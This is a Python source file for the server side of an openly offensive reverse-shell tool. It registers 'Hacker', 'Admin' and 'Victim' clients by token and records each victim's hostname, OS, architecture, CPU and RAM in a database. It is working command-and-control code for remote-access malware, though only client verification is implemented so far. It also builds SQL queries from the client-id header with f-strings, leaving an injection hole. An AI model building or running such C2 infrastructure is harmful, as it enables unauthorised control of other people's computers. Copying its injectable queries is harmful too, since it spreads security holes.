""" The reverse shell server and request handler. """

# ---- imports
import sys
import reverse_shell.utils as ut
import json as js
from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus
from functools import partial
from binascii import Error as b64decodeError
from config import Config


class ZrevshellServer(BaseHTTPRequestHandler):
    """ Request handling. """

    def __init__(self, config: Config, *args, **kwargs):
        # Our configuration: tokens, ip, port and etc...
        self.config = config
        super().__init__(*args, **kwargs)

    def c_send_error(self, code: HTTPStatus):
        self.send_error(code)
        self.end_headers()

    def check_verified_request(self):
        """ Check if the request is verified by ensuring the existence and validity of auth_token 
        and existence of the client-id header """

        client_id = self.headers.get("client-id")  # This might be None if the client_id doesn't exist
        auth_token = self.headers.get("Authorization")  # same goes here

        # If the client_id header doesn't exist then we tell the user
        # that he is sending a bad request
        if client_id is None:
            self.c_send_error(HTTPStatus.BAD_REQUEST)
            return False

        if auth_token is not None:
            # Let's check if the auth_token matches ours
            # First let's decode the token, it might not be valid
            # base64 so we'll error handle it.
            try:
                # Remove the Basic string from the token
                auth_token = auth_token.removeprefix("Basic").strip()
                decoded_token = ut.decode_token(auth_token)
            except b64decodeError:
                pass
            else:
                if decoded_token == self.config.auth_token:
                    return True

        # Well if the user doesn't pass through the above it means the client ain't
        # verified so let's tell that to the client
        self.c_send_error(HTTPStatus.UNAUTHORIZED)
        return False

    def get_client_type(self, client_id: str):
        """ Get the client type of a specified client from the database. This could also be a means to check if the client
        has verified itself. """
        # query data from the database
        cursor = self.config.session_data_db.cursor()
        usr_client_type = self.config.query_db(cursor, f"SELECT client_type FROM clients WHERE client_id='{client_id}'")
        # Let's return None if the client is not find in the database or an error occurred
        if usr_client_type is None or len(usr_client_type) == 0:
            return None

        # if it's not let's return the client_type, by flattening out the list and tuple and
        # converting into the client_type thing.
        usr_client_type = usr_client_type[0][0]
        result = [client_type for client_type in [ut.ClientType.Hacker, ut.ClientType.Victim, ut.ClientType.Admin] if usr_client_type == client_type.__str__()]
        return result[0]

    def is_authenticated_for_command(self, client_id: str, cmd: str):
        """ Check if the user is authenticated for using the `cmd` send an unauthorized error if the client
         is unauthorized """
        # get the client_type of the client
        # since we know we have the client_id when we check for the
        # headers let's blindly access it here and use it to get the client_type
        client_type = self.get_client_type(client_id)
        if client_type is None or client_type not in self.config.server_cmd_privileges.get(cmd, []):
            # the client doesn't have a client_type meaning it wasn't registered in
            # the server or it's not allowed to access the servers database. So send an unauthorized error and
            # return
            self.c_send_error(HTTPStatus.UNAUTHORIZED)
            return False
        return True

    def get_header_token(self, token_name: str, fallback=None):
        """ Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist """
        token = self.headers.get(token_name, None)

        try:
            if token is not None:
                token = ut.decode_token(token)
            return token
        except (b64decodeError, UnicodeDecodeError):
            return fallback

    def insert_client_to_db(self, client_id: str, client_type: str):
        """ Insert a newly verified user to the database. return None if an error occurs. """
        # Initialize database connection and cursor
        return self.config.execute_on_session_db(f"INSERT INTO clients VALUES('{client_id}', '{client_type}', 1)")

    def insert_victim_info_db(self, victim_id: str, raw_str: str):
        """ Insert victims info and specs to the victim_info database. returns None if some error happens"""
        # Define database cursor
        cursor = self.config.session_data_db.cursor()
        try:
            victim_info = js.loads(raw_str)
        except js.JSONDecodeError:
            # Incase if the data the user sent is not valid json
            # we are going to set victim_info to None and later on set
            # the columns to null
            victim_info = None

        if victim_info is not None:
            # Get all the info we need
            host_name = victim_info.get("host_name", None)
            os = victim_info.get("os", None)
            arch = victim_info.get("arch", None)
            cpu = victim_info.get("cpu", None)
            ram = victim_info.get("ram", None)

            # Insert that to the victims database
            return self.config.execute_on_session_db("INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)", [victim_id, host_name, os, arch, cpu, ram])
        else:
            # Well we couldn't even parse the victim info so let's just
            # insert null everywhere
            return self.config.execute_on_session_db("INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)", [victim_id, *[None for _ in range(5)]])

    def do_GET(self):
        """ Handle the GET requests. """
        pass

    def do_POST(self):
        """ Handle POST requests. """
        # Check if the request is valid
        if not self.check_verified_request():
            return

        # Get the client id
        client_id = self.headers.get("client-id").__str__()

        # the self.path is the command's id in this case
        command = self.config.server_cmds.get(self.path, None)

        if command is None:
            # The path requested doesn't match the server_cmds so
            # tell the user that using a 404
            self.c_send_error(HTTPStatus.NOT_FOUND)

        # ---- Command execution & authorization˙

        # Let's first do the verify path
        if command == "verify":
            # First get the client_type of the user and check
            # if the user claims match his tokens.
            client_type = self.headers.get("client-type", None)

            hacker_token = self.get_header_token("hacker-token")
            admin_token = self.get_header_token("admin-token")

            legit_user = {
                ut.ClientType.Hacker.__str__(): hacker_token is not None and hacker_token == self.config.hacker_token,
                ut.ClientType.Admin.__str__(): admin_token is not None and admin_token == self.config.admin_token,
                ut.ClientType.Victim.__str__(): True
            }

            if client_type is not None and legit_user.get(client_type, False):
                # The user is valid so let's add him to the database
                result = self.insert_client_to_db(client_id, client_type)
                if result is None:
                    # This means the sql query didn't go well
                    # let's respond with a server error
                    self.c_send_error(HTTPStatus.INTERNAL_SERVER_ERROR)
                    return

                # if the client connected is the victim then we're gonna add the victim
                # to another table called victims
                if client_type.__str__() == ut.ClientType.Victim.__str__():
                    # Get the body of the request and pass it to the method
                    try:
                        content_length = int(self.headers.get("content-length", 0))
                    except ValueError:
                        # Incase the content-length header was not a number
                        # use 0 as the default
                        content_length = 0

                    raw_data = self.rfile.read(content_length)
                    result = self.insert_victim_info_db(client_id, raw_data.decode())

                    if result is None:
                        # If we fail to insert the data into the database for some reason
                        self.c_send_error(HTTPStatus.INTERNAL_SERVER_ERROR)
                        return

                # If all is good then send the OK back
                self.send_response(HTTPStatus.OK)
                self.end_headers()

            else:
                self.c_send_error(HTTPStatus.BAD_REQUEST)


def start_server():
    """ Start the HTTP server """

    # Initializing our configuration
    configuration = Config()

    # Getting the ip and port from the config
    ip, port = configuration.ip, configuration.port

    # We are using partials because only can pass the class to
    # HTTPServer not an object so we can use functools.partial to solve
    # the issue.
    zrevshell_server = partial(ZrevshellServer, configuration)

    # Initiate the server
    ut.log("debug", f"Server is starting on ({ip}:{port})...")
    httpd = HTTPServer((ip, port), zrevshell_server)
    ut.log("success", "Server has successfully started!")
    # Means print an empty line, i think...
    print("\r")
    ut.log("info", "-------- Tokens --------")
    ut.log("info", f"Authentication Token: {configuration.auth_token}")
    ut.log("info", f"Administration Token: {configuration.admin_token}")
    ut.log("info", f"Hacking Token: {configuration.hacker_token}")

    # Create some empty space for the proceeding
    print("\r")
    # Create a header for the logs that the http server generates
    ut.log("info", "--------- Server Logs --------")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        # It's because we use keyboard interrupt normally to stop
        # the server.
        pass

    # Actually does nothing, but incase we override it
    # and need to clean up our server
    httpd.server_close()

    ut.log("debug", f"Server has shutdown!")
    sys.exit(0)


def main():
    """ Run the reverse shell server """
    start_server()


if __name__ == "__main__":
    main()
